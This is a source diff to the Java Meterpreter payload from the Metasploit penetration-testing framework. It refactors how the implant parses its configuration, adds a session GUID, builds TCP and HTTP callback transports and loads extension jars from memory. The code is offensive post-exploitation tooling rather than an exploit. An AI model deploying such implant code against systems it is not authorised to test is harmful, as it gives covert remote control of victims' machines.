@@ -22,7 +22,9 @@ import java.util.jar.JarInputStream;
 
 import com.metasploit.meterpreter.command.Command;
 import com.metasploit.meterpreter.core.core_loadlib;
+import com.metasploit.stage.Config;
 import com.metasploit.stage.ConfigParser;
+import com.metasploit.stage.TransportConfig;
 
 /**
  * Main meterpreter class. Responsible for keeping all the stuff together and for managing channels.
@@ -43,43 +45,30 @@ public class Meterpreter {
     private final TransportList transports = new TransportList();
     protected int ignoreBlocks = 0;
     private byte[] uuid;
+    private byte[] sessionGUID;
     private long sessionExpiry;
 
     protected void loadConfiguration(DataInputStream in, OutputStream rawOut, byte[] configuration) throws MalformedURLException {
-
-        // socket handle is 4 bytes, followed by exit func, both of
-        // which we ignore.
-        int csr = 8;
-
-        // We start with the expiry, which is a 32 bit int
-        setExpiry(ConfigParser.unpack32(configuration, csr));
-        csr += 4;
-
-        // this is followed with the UUID
-        this.uuid = ConfigParser.readBytes(configuration, csr, ConfigParser.UUID_LEN);
-        csr += ConfigParser.UUID_LEN;
+        Config config = ConfigParser.parseConfig(configuration);
+        this.sessionExpiry = config.session_expiry + System.currentTimeMillis();
+        this.uuid = config.uuid;
+        this.sessionGUID = config.session_guid;
 
         // here we need to loop through all the given transports, we know that we're
         // going to get at least one.
-        while (configuration[csr] != '\0') {
-            // read the transport URL
-            String url = ConfigParser.readString(configuration, csr, ConfigParser.URL_LEN);
-            csr += ConfigParser.URL_LEN;
-
-            Transport t = null;
-            if (url.startsWith("tcp")) {
-                t = new TcpTransport(url);
+        for (TransportConfig transportConfig : config.transportConfigList) {
+            Transport t;
+            if (transportConfig.url.startsWith("tcp")) {
+                t = new TcpTransport(this, transportConfig.url, transportConfig);
             } else {
-                t = new HttpTransport(url);
+                t = new HttpTransport(this, transportConfig.url, transportConfig);
             }
-
-            csr = t.parseConfig(configuration, csr);
             if (this.transports.isEmpty()) {
                 t.bind(in, rawOut);
             }
             this.transports.add(t);
         }
-        
+
         // we don't currently support extensions, so when we reach the end of the
         // list of transports we just bomb out.
     }
@@ -90,6 +79,14 @@ public class Meterpreter {
 
     public void setUUID(byte[] newUuid) {
         this.uuid = newUuid;
+    }
+
+    public byte[] getSessionGUID() {
+        return this.sessionGUID;
+    }
+
+    public void setSessionGUID(byte[] guid) {
+        this.sessionGUID = guid;
     }
 
     public long getExpiry() {
@@ -139,6 +136,7 @@ public class Meterpreter {
         this.loadExtensions = loadExtensions;
         this.commandManager = new CommandManager();
         this.channels.add(null); // main communication channel?
+
         if (redirectErrors) {
             errBuffer = new ByteArrayOutputStream();
             err = new PrintStream(errBuffer);
@@ -205,7 +203,7 @@ public class Meterpreter {
     }
 
     /**
-     * Register a new channel in this meterpreter. Used only by {@link Channel#Channel(Meterpreter, java.io.InputStream, OutputStream, java.io.InputStream)}.
+     * Register a new channel in this meterpreter. Used only by {@link Channel#(Meterpreter, java.io.InputStream, OutputStream, java.io.InputStream)}.
      *
      * @param channel The channel to register
      * @return The channel's ID.
@@ -276,11 +274,11 @@ public class Meterpreter {
     /**
      * Send a request packet over this meterpreter.
      *
-     * @param packet Packet parameters
-     * @param method Method to invoke
+     * @param commandId ID of the associated command
+     * @param tlv Packet parameters
      */
-    public void writeRequestPacket(String method, TLVPacket tlv) throws IOException {
-        tlv.add(TLVType.TLV_TYPE_METHOD, method);
+    public void writeRequestPacket(int commandId, TLVPacket tlv) throws IOException {
+        tlv.add(TLVType.TLV_TYPE_COMMAND_ID, commandId);
         char[] requestID = new char[32];
         for (int i = 0; i < requestID.length; i++) {
             requestID[i] = (char) ('A' + rnd.nextInt(26));
@@ -294,7 +292,7 @@ public class Meterpreter {
      *
      * @param data The extension jar's content as a byte array
      */
-    public String[] loadExtension(byte[] data) throws Exception {
+    public Integer[] loadExtension(byte[] data) throws Exception {
         ClassLoader classLoader = getClass().getClassLoader();
         if (loadExtensions) {
             URL url = MemoryBufferURLConnection.createURL(data, "application/jar");
@@ -305,6 +303,6 @@ public class Meterpreter {
         ExtensionLoader loader = (ExtensionLoader) classLoader.loadClass(loaderName).newInstance();
         commandManager.resetNewCommands();
         loader.load(commandManager);
-        return commandManager.getNewCommands();
+        return commandManager.getNewCommandIds();
     }
 }
